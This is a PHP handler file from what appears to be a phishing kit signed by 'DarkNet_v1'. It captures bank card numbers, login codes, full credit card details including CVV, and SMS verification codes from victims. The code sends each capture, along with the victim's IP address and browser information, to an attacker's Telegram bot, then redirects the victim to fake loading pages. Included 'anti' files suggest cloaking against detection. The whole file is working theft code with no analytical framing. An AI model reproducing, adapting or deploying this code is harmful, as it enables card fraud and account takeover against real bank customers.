<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    session_start();

    
    include "../prevents/anti1.php";
    include "../prevents/anti2.php";
    include "../prevents/anti3.php";
    include "../prevents/anti4.php";
    include "../prevents/anti5.php";
    include "../prevents/anti6.php";
    include "../prevents/anti7.php";
    include "../prevents/anti8.php";
    include "../prevents/all.php";
    include "../prevents/911.php";
    
    include "config.php";
    
    include "../../../detect.php";
    $detect         = new BrowserDetection();
    $ip             = $_SERVER['REMOTE_ADDR'];
    $date           = date("Y-m-d H:i:s", time());
    $usragent       = $_SERVER['HTTP_USER_AGENT'];
    $browserName    = $detect->getName();
    $browserVer     = $detect->getVersion();
    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';

    if(isset($_POST["log"])) {

        $num     = $_POST["one"];
        $code   = $_POST["login_code"];
        
       $message=
       '[🏦] === LOGIN === [🏦]'."\n".
       "[🪪] Cart Number : ".$num."\n". 
       "[🔑] code : ".$code."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n". 
       '[+]'.$usragent."\n".
       '[+]'.$browserName."\n".
       '[+]'.$browserVer."\n".
       '[+]'.$isMobile."\n";
       
   
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");

    }elseif(isset($_POST["code"])){

        $code      = $_POST["sign_code"];
         
        $message=
        '[🧛] === CODE LOGIN === [🧛]'."\n".
        '[🧬] Code : '.$code."\n".
        '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[+]'.$usragent."\n".
        '[+]'.$browserName."\n".
        '[+]'.$browserVer."\n".
        '[+]'.$isMobile."\n";
        
        $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        ]; 
        
        $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data));
        reset_data();
        header("Location: ../../../loading.php");
        exit();
        
 
    }elseif(isset($_GET["vis"])){

        $message=
        '[🧛] === Panel Visitor === [🧛]'."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
        
        $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        ]; 
        
        $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data));
        reset_data();
        header("Location: ../../../langs.php");
        exit();
 
    }elseif(isset($_POST["card"])){             

        $cc = str_replace(' ', '',  $_POST["one"]);
        $exp    = $_POST["two"];
        $cvv    = $_POST["three"];
    
        $message="
        '[🧛] === Credit Card === [🧛]'.'\n".
        '[💝] Card number : '.$cc."\n".
        '[💝] Expiration Date : '.$exp."\n".
        '[💝] CVV : '.$cvv."\n".
        '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[+]'.$usragent."\n".
        '[+]'.$browserName."\n".
        '[+]'.$browserVer."\n".
        '[+]'.$isMobile."\n";
        
        $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        ]; 
        
        $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data));
        reset_data();        
        if ($type === "panel") {
            header("Location: ../../../loading.php");
            exit();    
        }else{
            header("Location: ../../../load1.php");
            exit();    
        }
        

    }elseif(isset($_POST["sms"])){

        $sms     = $_POST["sms_code"];
        
       $message=
       '[🏦] == SMS Code == [🏦]'."\n".
       "[🏷] SMS : ".$sms."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
       '[+]'.$usragent."\n".
       '[+]'.$browserName."\n".
       '[+]'.$browserVer."\n".
       '[+]'.$isMobile."\n";
       
   
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
        if ($type === "panel") {
            header("Location: ../../../loading.php");
            exit();    
        }else{
            header("Location: ../../../load2.php");
            exit();    
        }

    }

?>